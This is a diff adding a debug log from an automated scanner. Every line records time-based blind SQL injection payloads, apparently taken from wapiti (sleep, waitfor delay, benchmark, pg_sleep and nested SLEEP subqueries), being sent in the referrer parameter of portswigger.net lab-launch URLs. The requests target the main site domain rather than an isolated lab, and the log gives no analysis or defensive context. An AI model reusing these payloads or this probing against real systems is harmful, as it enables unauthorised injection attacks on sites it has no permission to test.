@@ -1,0 +1,581 @@
+2024-07-26 12:15:44,663 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:45,876 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1 HTTP/1.1" 200 None
+2024-07-26 12:15:46,187 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:47,405 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input HTTP/1.1" 200 None
+2024-07-26 12:15:47,705 - INFO - [12:15:47] Payload testing: # from wapiti
+2024-07-26 12:15:47,715 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:48,847 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputsleep(5) HTTP/1.1" 200 None
+2024-07-26 12:15:49,152 - INFO - [12:15:49] Payload testing: sleep(5)#
+2024-07-26 12:15:49,155 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:50,316 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:15:50,609 - INFO - [12:15:50] Payload testing: 1 or sleep(5)#
+2024-07-26 12:15:50,612 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:51,744 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:15:52,053 - INFO - [12:15:52] Payload testing: " or sleep(5)#
+2024-07-26 12:15:52,056 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:53,194 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:15:53,802 - INFO - [12:15:53] Payload testing: ' or sleep(5)#
+2024-07-26 12:15:53,805 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:54,921 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22%20or%20sleep(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:15:55,215 - INFO - [12:15:55] Payload testing: " or sleep(5)="
+2024-07-26 12:15:55,232 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:56,497 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20or%20sleep(5)=' HTTP/1.1" 200 None
+2024-07-26 12:15:56,801 - INFO - [12:15:56] Payload testing: ' or sleep(5)='
+2024-07-26 12:15:56,803 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:58,130 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1)%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:15:58,492 - INFO - [12:15:58] Payload testing: 1) or sleep(5)#
+2024-07-26 12:15:58,495 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:15:59,925 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22)%20or%20sleep(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:16:00,370 - INFO - [12:16:00] Payload testing: ") or sleep(5)="
+2024-07-26 12:16:00,373 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:01,560 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input')%20or%20sleep(5)=' HTTP/1.1" 200 None
+2024-07-26 12:16:01,842 - INFO - [12:16:01] Payload testing: ') or sleep(5)='
+2024-07-26 12:16:01,842 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:03,142 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1))%20or%20sleep(5) HTTP/1.1" 200 None
+2024-07-26 12:16:03,494 - INFO - [12:16:03] Payload testing: 1)) or sleep(5)#
+2024-07-26 12:16:03,497 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:04,825 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22))%20or%20sleep(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:16:04,874 - INFO - [12:16:04] Payload testing: ")) or sleep(5)="
+2024-07-26 12:16:04,890 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:06,005 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'))%20or%20sleep(5)=' HTTP/1.1" 200 None
+2024-07-26 12:16:06,356 - INFO - [12:16:06] Payload testing: ')) or sleep(5)='
+2024-07-26 12:16:06,372 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:07,547 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input;waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:07,897 - INFO - [12:16:07] Payload testing: ;waitfor delay '0:0:5'--
+2024-07-26 12:16:07,899 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:09,123 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input);waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:09,442 - INFO - [12:16:09] Payload testing: );waitfor delay '0:0:5'--
+2024-07-26 12:16:09,445 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:10,622 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input';waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:10,919 - INFO - [12:16:10] Payload testing: ';waitfor delay '0:0:5'--
+2024-07-26 12:16:10,922 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:12,376 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22;waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:12,657 - INFO - [12:16:12] Payload testing: ";waitfor delay '0:0:5'--
+2024-07-26 12:16:12,660 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:13,852 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input');waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:14,207 - INFO - [12:16:14] Payload testing: ');waitfor delay '0:0:5'--
+2024-07-26 12:16:14,210 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:15,464 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22);waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:15,864 - INFO - [12:16:15] Payload testing: ");waitfor delay '0:0:5'--
+2024-07-26 12:16:15,881 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:17,169 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input));waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:17,431 - INFO - [12:16:17] Payload testing: ));waitfor delay '0:0:5'--
+2024-07-26 12:16:17,433 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:18,733 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'));waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:19,181 - INFO - [12:16:19] Payload testing: '));waitfor delay '0:0:5'--
+2024-07-26 12:16:19,184 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:20,439 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22));waitfor%20delay%20'0:0:5'-- HTTP/1.1" 200 None
+2024-07-26 12:16:20,893 - INFO - [12:16:20] Payload testing: "));waitfor delay '0:0:5'--
+2024-07-26 12:16:20,904 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:22,043 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputbenchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:22,379 - INFO - [12:16:22] Payload testing: benchmark(10000000,MD5(1))#
+2024-07-26 12:16:22,379 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:23,603 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:23,942 - INFO - [12:16:23] Payload testing: 1 or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:23,945 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:25,240 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:25,989 - INFO - [12:16:25] Payload testing: " or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:25,989 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:27,584 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:28,032 - INFO - [12:16:28] Payload testing: ' or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:28,035 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:29,153 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1)%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:29,469 - INFO - [12:16:29] Payload testing: 1) or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:29,469 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:30,830 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22)%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:31,206 - INFO - [12:16:31] Payload testing: ") or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:31,209 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:33,083 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input')%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:33,516 - INFO - [12:16:33] Payload testing: ') or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:33,516 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:35,714 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1))%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:36,581 - INFO - [12:16:36] Payload testing: 1)) or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:36,581 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:38,380 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22))%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:38,813 - INFO - [12:16:38] Payload testing: ")) or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:38,813 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:40,883 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'))%20or%20benchmark(10000000,MD5(1)) HTTP/1.1" 200 None
+2024-07-26 12:16:41,331 - INFO - [12:16:41] Payload testing: ')) or benchmark(10000000,MD5(1))#
+2024-07-26 12:16:41,334 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:43,075 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputpg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:16:43,408 - INFO - [12:16:43] Payload testing: pg_sleep(5)--
+2024-07-26 12:16:43,425 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:46,263 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:16:46,672 - INFO - [12:16:46] Payload testing: 1 or pg_sleep(5)--
+2024-07-26 12:16:46,675 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:47,951 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:16:48,259 - INFO - [12:16:48] Payload testing: " or pg_sleep(5)--
+2024-07-26 12:16:48,261 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:49,638 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:16:50,733 - INFO - [12:16:50] Payload testing: ' or pg_sleep(5)--
+2024-07-26 12:16:50,737 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:54,616 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1)%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:16:55,448 - INFO - [12:16:55] Payload testing: 1) or pg_sleep(5)--
+2024-07-26 12:16:55,448 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:16:59,395 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22)%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:16:59,962 - INFO - [12:16:59] Payload testing: ") or pg_sleep(5)--
+2024-07-26 12:16:59,962 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:01,260 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input')%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:01,577 - INFO - [12:17:01] Payload testing: ') or pg_sleep(5)--
+2024-07-26 12:17:01,577 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:02,892 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input1))%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:03,259 - INFO - [12:17:03] Payload testing: 1)) or pg_sleep(5)--
+2024-07-26 12:17:03,259 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:04,374 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input%22))%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:04,787 - INFO - [12:17:04] Payload testing: ")) or pg_sleep(5)--
+2024-07-26 12:17:04,790 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:06,081 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-input'))%20or%20pg_sleep(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:06,410 - INFO - [12:17:06] Payload testing: ')) or pg_sleep(5)--
+2024-07-26 12:17:06,413 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:07,672 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))bAKL)%20AND%20'vRxe'='vRxe HTTP/1.1" 200 None
+2024-07-26 12:17:08,022 - INFO - [12:17:08] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+2024-07-26 12:17:08,025 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:09,180 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%252Fweb-security%252Fclickjacking%252Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))YjoC)%20AND%20'%25'=' HTTP/1.1" 200 None
+2024-07-26 12:17:09,448 - INFO - [12:17:09] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+2024-07-26 12:17:09,451 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:10,619 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP) HTTP/1.1" 200 None
+2024-07-26 12:17:10,919 - INFO - [12:17:10] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+2024-07-26 12:17:10,919 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:12,145 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)-- HTTP/1.1" 200 None
+2024-07-26 12:17:12,455 - INFO - [12:17:12] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+2024-07-26 12:17:12,468 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:13,608 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputAND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP) HTTP/1.1" 200 None
+2024-07-26 12:17:13,921 - INFO - [12:17:13] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+2024-07-26 12:17:13,924 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:15,165 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:15,465 - INFO - [12:17:15] Payload testing: SLEEP(5)#
+2024-07-26 12:17:15,465 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:16,665 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:17,082 - INFO - [12:17:17] Payload testing: SLEEP(5)--
+2024-07-26 12:17:17,082 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:18,146 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:17:18,515 - INFO - [12:17:18] Payload testing: SLEEP(5)="
+2024-07-26 12:17:18,515 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:19,611 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputSLEEP(5)=' HTTP/1.1" 200 None
+2024-07-26 12:17:19,878 - INFO - [12:17:19] Payload testing: SLEEP(5)='
+2024-07-26 12:17:19,878 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:21,011 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:21,394 - INFO - [12:17:21] Payload testing: or SLEEP(5)
+2024-07-26 12:17:21,394 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:22,527 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5) HTTP/1.1" 200 None
+2024-07-26 12:17:22,826 - INFO - [12:17:22] Payload testing: or SLEEP(5)#
+2024-07-26 12:17:22,842 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:23,941 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5)-- HTTP/1.1" 200 None
+2024-07-26 12:17:24,324 - INFO - [12:17:24] Payload testing: or SLEEP(5)--
+2024-07-26 12:17:24,324 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:26,031 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5)=%22 HTTP/1.1" 200 None
+2024-07-26 12:17:26,091 - INFO - [12:17:26] Payload testing: or SLEEP(5)="
+2024-07-26 12:17:26,093 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-07-26 12:17:27,197 - DEBUG - https://portswigger.net:443 "GET /users?returnurl=/academy/labs/launch/8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766?referrer=%2Fweb-security%2Fclickjacking%2Flab-prefilled-form-inputor%20SLEEP(5)=' HTTP/1.1" 200 None
+2024-07-26 12:17:27,803 - INFO - [12:17:27] Payload testing: or SLEEP(5)='
